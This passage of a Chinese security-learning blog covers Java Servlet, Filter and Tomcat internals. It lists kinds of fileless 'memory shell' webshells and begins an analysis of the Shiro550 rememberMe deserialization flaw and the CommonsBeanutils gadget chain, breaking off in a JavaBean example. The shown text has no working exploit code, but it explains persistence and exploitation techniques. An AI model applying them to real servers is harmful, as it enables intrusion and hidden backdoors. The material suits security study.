方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。</p><p>5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。</p><p>6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。</p><h4 id="Filter的实现"><a href="#Filter的实现" class="headerlink" title="Filter的实现"></a>Filter的实现</h4><p>Filter是一个接口，实现一个Filter只需要重写<code>init</code>、<code>doFilter</code>、<code>destroy</code>方法即可，其中过滤逻辑都在<code>doFilter</code>方法中实现。</p><p><code>Filter</code>的配置类似于<code>Servlet</code>，由<code>&lt;filter&gt;</code>和<code>&lt;filter-mapping&gt;</code>两组标签组成，如果Servlet版本大于3.0同样可以使用注解的方式配置Filter。</p><h4 id="Filter-的生命周期"><a href="#Filter-的生命周期" class="headerlink" title="Filter 的生命周期"></a>Filter 的生命周期</h4><p>与 servlet 一样，Filter 的创建和销毁也由 Web 容器负责。Web 应用程序启动时，Web 服务器将创建 Filter 的实例对象，并调用其 init() 方法，读取 web.xml 配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter 对象只会创建一次，init 方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。Filter 对象创建后会驻留在内存，当 Web 应用移除或服务器停止时才销毁。在 Web 容器卸载 Filter 对象之前被调用。该方法在 Filter 的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</p><h4 id="Filter链"><a href="#Filter链" class="headerlink" title="Filter链"></a>Filter链</h4><p>当多个 Filter 同时存在的时候，组成了 Filter 链。Web 服务器根据 Filter 在 web.xml 文件中的注册顺序，决定先调用哪个 Filter。当第一个 Filter 的 doFilter 方法被调用时，web服务器会创建一个代表 Filter 链的 FilterChain 对象传递给该方法，通过判断 FilterChain 中是否还有 Filter 决定后面是否还调用 Filter。</p><p><img src="https://i.mji.rip/2023/10/25/6d4449465499c6afd9ae26f7a9c1f185.png" alt="image-20231025195002798"></p><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p><code>Servlet</code>是在 <code>Java Web</code>容器中运行的<code>小程序</code>,通常我们用<code>Servlet</code>来处理一些较为复杂的服务器端的业务逻辑。<code>Servlet</code>是<code>Java EE</code>的核心,也是所有的MVC框架的实现的根本。</p><h4 id="请求的处理过程"><a href="#请求的处理过程" class="headerlink" title="请求的处理过程"></a>请求的处理过程</h4><p>客户端发起一个 http 请求，比如 get 类型。</p><p>Servlet 容器接收到请求，根据请求信息，封装成 HttpServletRequest 和HttpServletResponse 对象。这步也就是我们的传参。</p><p>Servlet容器调用 HttpServlet 的 init() 方法，init 方法只在第一次请求的时候被调用。</p><p>Servlet 容器调用 service() 方法。</p><p>service() 方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。</p><p>doXXX 方法中是我们自己写的业务逻辑。</p><p>业务逻辑处理完成之后，返回给 Servlet 容器，然后容器将结果返回给客户端。</p><p>容器关闭时候，会调用 destory 方法。</p><h4 id="Servlet的定义"><a href="#Servlet的定义" class="headerlink" title="Servlet的定义"></a>Servlet的定义</h4><p><strong>web.xml的配置：</strong></p><p><code>Servlet3.0</code> 之前的版本都需要在<code>web.xml</code> 中配置<code>servlet标签</code>，<code>servlet标签</code>是由<code>servlet</code>和<code>servlet-mapping</code>标签组成的,两者之间通过在<code>servlet</code>和<code>servlet-mapping</code>标签中同样的<code>servlet-name</code>名称来实现关联的。</p><p><strong>注解配置：</strong></p><p>值得注意的是在 Servlet 3.0 之后( Tomcat7+)可以使用注解方式配置 Servlet 了,在任意的Java类添加<code>javax.servlet.annotation.WebServlet</code>注解即可。</p><p>基于注解的方式配置Servlet实质上是对基于<code>web.xml</code>方式配置的简化，极大的简化了Servlet的配置方式，但是也提升了对Servlet配置管理的难度，因为我们不得不去查找所有包含了<code>@WebServlet</code>注解的类来寻找Servlet的定义，而不再只是查看<code>web.xml</code>中的<code>servlet</code>标签配置。</p><p><strong>实现：</strong></p><p>定义一个 Servlet 很简单，只需要继承<code>javax.servlet.http.HttpServlet</code>类并重写<code>doXXX</code>(如<code>doGet、doPost</code>)方法或者<code>service</code>方法就可以了，其中需要注意的是重写<code>HttpServlet</code>类的<code>service</code>方法可以获取到上述七种Http请求方法的请求。（doGet&#x2F;doPost&#x2F;doDelete&#x2F;doHead&#x2F;doPut&#x2F;doOptions&#x2F;doTrace）</p><h4 id="servlet生命周期"><a href="#servlet生命周期" class="headerlink" title="servlet生命周期"></a>servlet生命周期</h4><p>1）服务器启动时 (web.xml 中配置 load-on-startup&#x3D;1，默认为 0)或者第一次请求该 servlet 时，就会初始化一个 Servlet 对象，也就是会执行初始化方法 init(ServletConfig conf)。</p><p>2）servlet 对象去处理所有客户端请求，在 service(ServletRequest req，ServletResponse res) 方法中执行</p><p>3）服务器关闭时，销毁这个 servlet 对象，执行 destroy() 方法。</p><p>4）由 JVM 进行垃圾回收。</p><h3 id="Request-和-Response"><a href="#Request-和-Response" class="headerlink" title="Request 和 Response"></a>Request 和 Response</h3><p>在<code>B/S架构</code>中最重要的就是浏览器和服务器端交互，<code>Java EE</code>将其封装为<code>请求</code>和<code>响应对象</code>，即 <code>request(HttpServletRequest)</code> 和 <code>response(HttpServletResponse)</code>。</p><p><code>HttpServletRequest</code>对象用于处理来自客户端的请求，当客户端通过HTTP协议访问服务器时，HTTP 中的所有信息都封装在这个对象中，通过<code>HttpServletRequest</code>对象可以获取到客户端请求的所有信息。</p><p><code>HttpServletResponse</code>对象用于响应客户端的请求，通过<code>HttpServletResponse</code>对象可以处理服务器端对客户端请求响应。</p><h3 id="Filter和Servlet总结："><a href="#Filter和Servlet总结：" class="headerlink" title="Filter和Servlet总结："></a>Filter和Servlet总结：</h3><ol><li><code>Filter</code>和<code>Servlet</code>都需要在<code>web.xml</code>或<code>注解</code>(<code>@WebFilter</code>、<code>@WebServlet</code>)中配置，而且配置方式是非常的相似的。</li><li><code>Filter</code>和<code>Servlet</code>都可以处理来自Http请求的请求，两者都有<code>request</code>、<code>response</code>对象。</li><li><code>Filter</code>和<code>Servlet</code>基础概念不一样，<code>Servlet</code>定义是容器端小程序，用于直接处理后端业务逻辑，而<code>Filter</code>的思想则是实现对Java Web请求资源的拦截过滤。</li><li><code>Filter</code>和<code>Servlet</code>虽然概念上不太一样，但都可以处理Http请求，都可以用来实现MVC控制器(<code>Struts2</code>和<code>Spring</code>框架分别基于<code>Filter</code>和<code>Servlet</code>技术实现的)。</li><li>一般来说<code>Filter</code>通常配置在<code>MVC</code>、<code>Servlet</code>和<code>JSP</code>请求前面，常用于后端权限控制、统一的Http请求参数过滤(<code>统一的XSS</code>、<code>SQL注入</code>、<code>Struts2命令执行</code>等攻击检测处理)处理，其核心主要体现在请求过滤上，而<code>Servlet</code>更多的是用来处理后端业务请求上。</li></ol><h2 id="Tomcat-基础介绍"><a href="#Tomcat-基础介绍" class="headerlink" title="Tomcat 基础介绍"></a>Tomcat 基础介绍</h2><h3 id="什么是-Tomcat"><a href="#什么是-Tomcat" class="headerlink" title="什么是 Tomcat"></a>什么是 Tomcat</h3><p>大致可以通过对标 Apache 来看一看。</p><p>Apache 是 web 服务器（静态解析，如 HTML），tomcat 是 java 应用服务器（动态解析，如 JSP）</p><p>Tomcat 只是一个 servlet(jsp 也翻译成 servlet)容器，可以认为是 apache 的扩展，但是可以独立于 apache 运行。</p><ul><li>​一句话概括一下，就是 Web 服务器，比较不稳定，但是业务能力比较强。</li></ul><h3 id="Tomcat-与-Servlet-的关系"><a href="#Tomcat-与-Servlet-的关系" class="headerlink" title="Tomcat 与 Servlet 的关系"></a>Tomcat 与 Servlet 的关系</h3><p>我们根据上面的基础知识可以知道Tomcat 是Web应用服务器，是一个Servlet&#x2F;JSP容器，而Servlet容器从上到下分别是 Engine、Host、Context、Wrapper。</p><p>在Tomcat中Wrapper代表一个独立的servlet实例，StandardWrapper是Wrapper接口的标准实现类（StandardWrapper 的主要任务就是载入Servlet类并且进行实例化），同时其从ContainerBase类继承过来，表示他是一个容器，只是他是最底层的容器，不能再含有任何的子容器了，且其父容器只能是context。而我们在也就是需要在这里去载入我们自定义的Servlet加载我们的内存马。</p><h2 id="Tomcat-架构"><a href="#Tomcat-架构" class="headerlink" title="Tomcat 架构"></a>Tomcat 架构</h2><h3 id="Tomcat-架构原理"><a href="#Tomcat-架构原理" class="headerlink" title="Tomcat 架构原理"></a>Tomcat 架构原理</h3><p>tomcat的框架如下图所示，主要有server、service、connector、container 四个部分 </p><p><img src="https://i.mji.rip/2023/10/25/f4d63124cec3f9b9fd6fba648346cf25.png" alt="image-20231025195032719"></p><p>图中可以看出 Tomcat 的心脏是两个组件：Connector 和 Container：<br>Connector 主要负责对外交流，进行 Socket 通信(基于 TCP&#x2F;IP)，解析 HTTP 报文，对应下图中的http服务器；</p><p>Container 主要处理 Connector 接受的请求，主要是处理内部事务，加载和管理 Servlet，由 Servlet 具体负责处理 Request 请求，对应下图中的servlet容器。</p><p><img src="https://i.mji.rip/2023/10/25/7f4b4458ea66cb54b7f40e58e423a156.png" alt="image-20231025195050119"></p><p>以上两个功能，分别对应着tomcat的两个核心组件连接器（Connector）和容器（Container），连接器负责对外交流（完成 Http 服务器功能），容器负责内部处理（完成 Servlet 容器功能）。</p><p><img src="https://i.mji.rip/2023/10/25/073ffe27f239822d2a31649cff8f34b9.md.png" alt="image-20231025195111671"></p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>即服务器，代表整个 Tomcat 服务器，它要能够提供一个接口让其它程序能够访问到这个 Service 集合、同时要维护它所包含的所有 Service 的生命周期，包括如何初始化、如何结束服务、如何找到别人要访问的 Service。还有其它的一些次要的任务，如您住在这个地方要向当地政府去登记啊、可能还有要配合当地公安机关日常的安全检查什么的。</p><p>一个 Tomcat 只有一个 Server Server 中包含至少一个 Service 组件，用于提供具体服务。</p><h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>Service 主要是为了关联 Connector 和 Container，同时会初始化它下面的其它组件，在 Connector 和 Container 外面多包一层，把它们组装在一起，向外面提供服务，一个 Service 可以设置多个 Connector，但是只能有一个 Container 容器。</p><p>Tomcat 中 Service 接口的标准实现类是 StandardService ，它不仅实现了 Service 借口同时还实现了 Lifecycle 接口，这样它就可以控制它下面的组件的生命周期了</p><h3 id="connecter"><a href="#connecter" class="headerlink" title="connecter"></a>connecter</h3><p>Connector 组件是 Tomcat 中两个核心组件之一，它的主要任务是负责接收浏览器的发过来的 tcp 连接请求，创建一个 Request 和 Response 对象分别用于和请求端交换数据，然后会产生一个线程来处理这个请求并把产生的 Request 和 Response 对象传给处理这个请求的线程，处理这个请求的线程就是 Container 组件要做的事了。</p><p>根据运行的逻辑图，我们也能看到连接器 connector 主要有三个功能：</p><p>socket 通信<br>解析处理应用层协议，如将 socket 连接封装成 request 和 response 对象，后续交给 Container 来处理<br>将 Request 转换为 ServletRequest，将 Response 转换为 ServletResponse</p><p>这些，其实在 shiro 开发的过程当中也是用到这个了的，而且当时我记得还特别容易写错类名。</p><p>其中 Tomcat 设计了三个组件，其负责功能如下：</p><ul><li>EndPoint: 负责网络通信，将字节流传递给 Processor；</li><li>Processor: 负责处理字节流生成 Tomcat Request 对象，将 Tomcat Request 对象传递给 Adapter；</li><li>Adapter: 负责将 Tomcat Request 对象转化成 ServletRequest 对象，传递给容器。</li></ul><h4 id="Adapter-组件"><a href="#Adapter-组件" class="headerlink" title="Adapter 组件"></a>Adapter 组件</h4><p>由于协议的不同，Tomcat 定义了自己的 Request 类来存放请求信息，但是这个不是标准的 ServletRequest。于是需要使用 Adapter 将 Tomcat Request 对象转成 ServletRequest 对象，然后就能调用容器的 service 方法。</p><p>简而言之，Endpoint 接收到 Socket 连接后，生成一个 SocketProcessor 任务提交到线程池进行处理，SocketProcessor 的 run 方法将调用 Processor 组件进行应用层协议的解析，Processor 解析后生成 Tomcat Request 对象，然后会调用 Adapter 的 Service 方法，方法内部通过如下代码将 Request 请求传递到容器中。</p><p>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</p><p>一个总的 Tomcat Connector 功能如图所示<img src="https://i.mji.rip/2023/10/25/1b94dc68288b74a6a659a1765322d4cc.png" alt="image-20231025195129773"></p><h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p>Container（又名Catalina）用于处理Connector发过来的servlet连接请求，它是容器的父接口，所有子容器都必须实现这个接口，Container 容器的设计用的是典型的责任链的设计模式，它有四个子容器组件构成，分别是：Engine、Host、Context、Wrapper，这四个组件不是平行的，而是父子关系，Engine 包含 Host，Host 包含 Context，Context 包含 Wrapper。</p><p><img src="https://i.mji.rip/2023/10/25/f05b2d4628e80b4b99e78a0f62e1ce93.md.png" alt="image-20231025195153658"></p><p>Tomcat 设计了 4 种容器: Engine、Host、Context、Wrapper，这四种容器是父子关系</p><ul><li>Engine: 最顶层容器组件，可以包含多个 Host。实现类为 org.apache.catalina.core.StandardEngine</li><li>Host: 代表一个虚拟主机，每个虚拟主机和某个域名 Domain Name 相匹配，可以包含多个 Context。实现类为 org.apache.catalina.core.StandardHost</li><li>Context: 一个 Context 对应于一个 Web 应用，可以包含多个 Wrapper。实现类为 org.apache.catalina.core.StandardContext</li><li>Wrapper: 一个 Wrapper 对应一个 Servlet。负责管理 Servlet ，包括 Servlet 的装载、初始化、执行以及资源回收。实现类为 org.apache.catalina.core.StandardWrapper</li></ul><p>通常一个 Servlet class 对应一个 Wrapper，如果有多个 Servlet 就可以定义多个 Wrapper，如果有多个 Wrapper 就要定义一个更高的 Container。</p><p>举个栗子，a.com和b.com分别对应着两个Host</p><p><img src="https://i.mji.rip/2023/10/25/f4f434b53380eded1250d6419e101dab.png" alt="image-20231025195214472"></p><p>每一个 Context 都有唯一的 path。这里的 path 不是指 servlet 绑定的 WebServlet 地址，而是指独立的一个 Web 应用地址。就好比 Tomat 默认的 &#x2F; 地址和 &#x2F;manager 地址就是两个不同的 web 应用，所以对应两个不同的 Context。要添加 Context 需要在 server.xml 中配置 docbase。</p><p>如下图所示， 在一个 web 应用中创建了 2 个 servlet 服务，WebServlet 地址分别是 &#x2F;Demo1 和 &#x2F;Demo2 。因为它们属于同一个 Web 应用所以 Context 一样，但访问地址不一样所以 Wrapper 不一样。&#x2F;manager 访问的 Web 应用是 Tomcat 默认的管理页面，是另外一个独立的 web 应用， 所以 Context 与前两个不一样。</p><p><img src="https://i.mji.rip/2023/10/25/42531669844863c0a1404fdf0bcb2dd0.md.png" alt="image-20231025195234445"></p><h2 id="Tomcat-的类加载机制"><a href="#Tomcat-的类加载机制" class="headerlink" title="Tomcat 的类加载机制"></a>Tomcat 的类加载机制</h2><p>由于 Tomcat 中有多个 WebApp 同时要确保之间相互隔离，所以 Tomcat 的类加载机制也不是传统的双亲委派机制。</p><p>Tomcat 自定义的类加载器 WebAppClassloader 为了确保隔离多个 WebApp 之间相互隔离，所以打破了双亲委托机制。每个 WebApp 用一个独有的 ClassLoader 实例来优先处理加载。它首先尝试自己加载某个类，如果找不到再交给父类加载器，其目的是优先加载 WEB 应用自己定义的类。</p><p>同时为了防止 WEB 应用自己的类覆盖 JRE 的核心类，在本地 WEB 应用目录下查找之前，先使用 ExtClassLoader（使用双亲委托机制）去加载，这样既打破了双亲委托，同时也能安全加载类。</p><h1 id="什么是内存马？"><a href="#什么是内存马？" class="headerlink" title="什么是内存马？"></a>什么是内存马？</h1><p>内存马又叫无文件马，闻名知其意。简单理解就是没有webshell文件落地的webshell。</p><p>目前安全行业主要讨论的内存马主要分为以下几种方式：</p><ul><li>动态注册 servlet&#x2F;filter&#x2F;listener（使用 servlet-api 的具体实现）</li><li>动态注册 interceptor&#x2F;controller（使用框架如 spring&#x2F;struts2）</li><li>动态注册使用<strong>职责链</strong>设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</li><li>使用 java agent 技术写入字节码</li></ul><h1 id="内存马有哪些？"><a href="#内存马有哪些？" class="headerlink" title="内存马有哪些？"></a>内存马有哪些？</h1><ul><li><p>传统Web应用型内存马</p><ul><li>Servlet型内存马 —&gt;   动态注册Servlet及映射路由</li><li>Filter型内存马        —&gt;   动态注册Filter及映射路由</li><li>Listener型内存马   —&gt;   动态注册Listener</li></ul><p>JavaWeb应用将Servlet与其映射、处理类&#x2F;Filter与其映射、处理类&#x2F;Listener与其处理类存放在Context中，并在程序允许时进行查找和匹配。传统Web应用型内存马就是内存马的处理代码与指定的映射动态的添加在Context中的关键位置中，使程序处理一个在本地代码、配置文件中不存在的恶意逻辑。</p></li><li><p>框架型内存马</p><ul><li>Spring Controller型内存马    —&gt;    动态注册Controller及映射路由</li><li>Spring Interceptor型内存马  —&gt;    动态注册Interceptor及映射路由</li><li>Spring Webflux型内存马       —&gt;     动态注册WebFilter及映射路由</li></ul><p>Spring MVC 使用Controller来接收用户的输入和封装Service，虽然有一部分开发习惯用Mapping来处理，但是这里通常代表处理一个用户请求的“端点”，类似于Servlet，而Interceptor拦截器类似Filter</p><p>Spring Webflux 是Spring Framework5.0中引入的新的响应式web框架，它不依赖Servlet-API，但是也同样必须有Filter这种思想，实际就是Filter。</p></li><li><p>中间件型内存马</p><ul><li>Tomcat Valve 型内存马    —&gt;    动态注册Valve</li><li>Tomcat Upgrade 型内存马    —&gt;     动态注册UpgradeProtocol</li><li>Tomcat Executor 型内存马    —&gt;     动态替换全局Executor</li><li>Tomcat Poller 型内存马    —&gt;     动态替换全局Poller</li><li>Grizzly Filter 型内存马    —&gt;     动态注册Grizzly Filter及映射路由</li></ul><p>中间件的很多设计都是“流式”、“管道式”。一般称之为职责链模式，每个关键点都会将Request处理，并传递给下一个处理者。在这种模式下，攻击者可以向职责链中插入自己的恶意逻辑，实现内存马的驻留。</p></li><li><p>Agent 型内存马</p><ul><li>Agent型内存马     —&gt;  通过Hook并修改关键方法添加恶意逻辑</li></ul><p>这个可以参考我之前写的插桩文章，学习一下Agent基础之后会对后期学习Agent型内存马很有帮助。</p></li><li><p>其他内存马</p><ul><li>WebSocket型内存马    —&gt;    动态注册Websocket路由及处理逻辑</li><li>Tomcat JSP型内存马    —&gt;    动态注册Tomcat JSP管理逻辑并实现驻留</li><li>线程型内存马    —&gt;    动态添加一个无法杀死的线程</li><li>RMI型内存马    —&gt;    动态启动一个RMI Registry</li></ul><p>对于WebSocket协议请求，JSP请求处理，各个中间件包含自己的逻辑，这些逻辑的具体实现也可以用来作为内存马的逻辑处理。</p><p>线程型内存马在系统中启动一个永不停止的线程，此时关键类无法被GC，会一直存在目标系统中，执行实现预定义的逻辑。而RMI内存马启动一个RMI Registry 并绑定恶意类作为后门。</p></li></ul><hr><p>因为内存马这里个人想深入学习，所以后续会力所能及将每种内存马的实现过程和复现过程中遇到的坑点都分享出来。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Shiro550+CB</title>
    <link href="/2023/10/09/Shiro550-CB/"/>
    <url>/2023/10/09/Shiro550-CB/</url>
    
    <content type="html"><![CDATA[<h1 id="通过Shiro550学习CB无依赖"><a href="#通过Shiro550学习CB无依赖" class="headerlink" title="通过Shiro550学习CB无依赖"></a>通过Shiro550学习CB无依赖</h1><h2 id="Shiro550漏洞分析"><a href="#Shiro550漏洞分析" class="headerlink" title="Shiro550漏洞分析"></a>Shiro550漏洞分析</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Shiro 是一个Java的安全框架，它包含身份认证、登录、验证权限、会话管理等功能。</p><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–&gt;AES解密–&gt;反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–&gt;AES加密–&gt;Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><a href="https://blog.csdn.net/m0_67401270/article/details/126721347?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169519689416800215053565%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=169519689416800215053565&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-126721347-null-null.142%5Ev94%5Einsert_down28v1&utm_term=idea%E6%90%AD%E5%BB%BAShiro&spm=1018.2226.3001.4187">环境搭建</a></h3><p>流程很简单，照着参考文章做几分钟就搭起来了。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="RememberMeManager"><a href="#RememberMeManager" class="headerlink" title="RememberMeManager"></a>RememberMeManager</h5><p><code>org.apache.shiro.mgt.RememberMeManager</code>，这个接口提供了如下 5 个方法：</p><p><img src="https://i.mji.rip/2023/10/09/fe8753cd33486a86e0eeb03bc9907efe.png" alt="image-20231008164024742"></p><ul><li><code>getRememberedPrincipals</code>在指定上下文中找到记住的 principals，也就是 RememberMe 的功能。</li><li><code>forgetIdentity</code>：忘记身份标识。</li><li><code>onSuccessfulLogin</code>：在登陆校验成功后调用，登陆成功时，保存对应的 principals 供程序未来进行访问。</li><li><code>onFailedLogin</code>：在登陆失败后调用，登陆失败时，在程序中“忘记”该 Subject 对应的 principals。</li><li><code>onLogout</code>: 在用户退出时调用，当一个 Subject 注销时，在程序中“忘记”该 Subject 对应的 principals。</li></ul><h5 id="AbstractRememberMeManager"><a href="#AbstractRememberMeManager" class="headerlink" title="AbstractRememberMeManager"></a>AbstractRememberMeManager</h5><p><code>AbstractRememberMeManager</code>是一个Shiro自带的抽象类它实现了<code>RememberMemanager</code>接口，先了解一下这个类中几个重要的成员变量。</p><p><img src="https://i.mji.rip/2023/10/09/5496a5fe2f2a5556b53023f439bbbe3c.png" alt="image-20231008165543767"></p><ul><li><code>DEFAULT_CIPHER_KEY_BYTES</code>：一个 Base64 的硬编码的 AES Key，也是本次漏洞的关键点，这个 key 会被同时设置为加解密 key 成员变量：encryptionCipherKey&#x2F;decryptionCipherKey 。</li><li><code>serializer</code>：Shiro 提供的序列化器，用来对序列化和反序列化标识用户身份的 PrincipalCollection 对象。</li><li><code>cipherService</code>：用来对数据加解密的类，实际上是 <code>org.apache.shiro.crypto.AesCipherService</code> 类，这是一个对称加密的实现，所以加解密的 key 是使用了同一个。</li></ul><p>通过其构造方法可以看到，这个类在在初始化时会创建<code>DefaultSerializer</code>作为序列化器，<code>AesCipherService</code> 作为加解密实现类，<code>DEFAULT_CIPHER_KEY_BYTES</code> 作为加解密的 key。</p><h5 id="CookieRememberMeManager"><a href="#CookieRememberMeManager" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h5><p><code>CookieRememberMeManager</code>继承了<code>AbstractRememberMeManager</code>这个抽象类，而且它实现了在HTTP无状态协议中使用cookie记录用户信息的相关能力。其中我们需要注意的方法是<code>getRememberedSerializedIdentity</code>，它的逻辑大概如下（获取Cookie中的内容并Base64解码返回byte数组）：</p><p><img src="https://i.mji.rip/2023/10/09/60983e34f4c8ae4b5bd3f2fec0b3e28b.png" alt="image-20231008170142829"></p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>这个方法就是我们整个Shiro550漏洞点，我们先简单看看它的逻辑：</p><p><img src="https://i.mji.rip/2023/10/09/ada93e76db174a9b3b7ab91a976f1876.png" alt="image-20231008172324992"></p><p>通过前置知识我们知道，在<code>CookieRememberMeManager</code> 对 <code>getRememberedSerializedIdentity</code> 的实现是获取 Cookie 并 Base64 解码。</p><p>然后将解码后的 byte 数组传入 <code>convertBytesToPrincipals</code> 。这个方法执行了两个操作：<code>decrypt</code> 和 <code>deserialize</code>。</p><p><img src="https://i.mji.rip/2023/10/09/9a7ae63ef4063c0ac9f4aef335c8b5e5.png" alt="image-20231009094034525"></p><p><strong>1.decrypt：</strong></p><p><img src="https://i.mji.rip/2023/10/09/013ac0b14058e49e6bf1b1c7850eb60a.png" alt="image-20231009092114692"></p><p><img src="https://i.mji.rip/2023/10/09/b3cb68e510c6b6bc1874f49badc8d050.png" alt="image-20231009092145495"></p><p>通过我们之前对<code>AbstractRememberMeManager</code>类中的成员变量的解释。<code>cipherService</code>是用来对数据加解密的类，实际上是 <code>org.apache.shiro.crypto.AesCipherService</code> 类，这是一个对称加密的实现，所以加解密的 key 是使用了同一个。</p><p>所以我们可以知道整个<strong>decrypt</strong>就是相当于用<code>AesCipherService</code> 进行解密，最后返回解密后的数组。</p><p><strong>2.deserialize</strong></p><p><img src="https://i.mji.rip/2023/10/09/648d0bcc345f4247faecf6a0a5cdd68b.png" alt="image-20231009094159287"></p><p><code>deserialize</code> 调用 <code>this.serializer#deserialize</code> 方法反序列化解密后的数据。</p><p><img src="https://i.mji.rip/2023/10/09/4d4f12f1f63a2b5f224bf7f324242149.png" alt="image-20231009094416710"></p><p>在 Shiro 中，序列化器的默认实现是 DefaultSerializer，可以看到其 <code>deserialize</code> 方法使用 Java 原生反序列化，使用 ByteArrayInputStream 将 byte 转为 ObjectInputStream ，并调用 <code>readObject</code> 方法执行反序列化操作。反序列化得到的 PrincipalCollection 会被 set 到 SubjectContext 供后续的校验调用。</p><p>以上就是 Shiro 创建 Subject 时执行的逻辑，跟下来后就看到了完整的漏洞触发链：攻击者构造恶意的反序列化数据，使用硬编码的 AES 加密，然后 Base64 编码放在 Cookie 中，即可触发漏洞利用。</p><h2 id="CB链"><a href="#CB链" class="headerlink" title="CB链"></a>CB链</h2><p>为什么要在Shiro中介绍CB呢？这是因为Shiro本身就依赖<code>commons-beanutils</code>组件。其实CC和CB组件在底层还是有很多关联的(比如我们稍后会分析到的BeanComparator)。所以有的文章会给Shiro加上<code>commons-collections</code>，来打Shiro的cc依赖，其实就是C2+C3+C6部分关键代码排列组合。我们本篇主要介绍Shiro无依赖的CB链。</p><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="什么是JavaBean？？？"><a href="#什么是JavaBean？？？" class="headerlink" title="什么是JavaBean？？？"></a>什么是JavaBean？？？</h4><p>JavaBean是符合如下标准的Java类：</p><ul><li>类是公共的</li><li>有一个无参公共的构造方法</li><li>有私有属性</li><li>有对应公共的getter、setter</li></ul><p>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String Name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String Name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.Name = Name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h4><p>BeanComparator 是 commons-beanutils 提供的用来比较两个 JavaBean 是否相等的类，其实现了<code>java.util.Comparator</code> 接口。</p><p>BeanComparator 在初始化时可以指定 property 属性名称和 comparator 对比器，如果不指定，则默认是 ComparableComparator 。</p><p><img src="https://i.mji.rip/2023/10/07/6dbdcc1bbdaa14a173949041d00e39e0.png" alt="image-20231007155948760"></p><p>BeanComparator 的 compare 方法接收两个对象，分别调用 <code>PropertyUtils.getProperty()</code> 方法获取两个对象的 property 属性的值，然后调用 <code>internalCompare()</code> 方法调用实例化时初始化的 comparator 的 compare 方法进行比较。</p><p><img src="https://img2023.cnblogs.com/blog/3074366/202307/3074366-20230730190833010-461293979.png" alt="image-20231007155948768"></p><p>第二个参数(comparator)可以传入实现<code>Comparator</code>且可序列化的任意类</p><h4 id="PropertyUtils-getProperty"><a href="#PropertyUtils-getProperty" class="headerlink" title="PropertyUtils.getProperty()"></a>PropertyUtils.getProperty()</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyUtils.getProperty(Object JavaBean，String <span class="hljs-string">&quot;JavaBean的属性&quot;</span>)<br></code></pre></td></tr></table></figure><p>在commons-beanutils中提供了一个静态方法<code>PropertyUtils.getProperty()</code>它可以直接调用任意JavaBean的getter方法。它接收两个参数：一个是JavaBean的实例对象，一个是JavaBean的属性。</p><p>举个栗子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//我们正常调用get方法是这样的：</span><br><span class="hljs-type">Person</span> 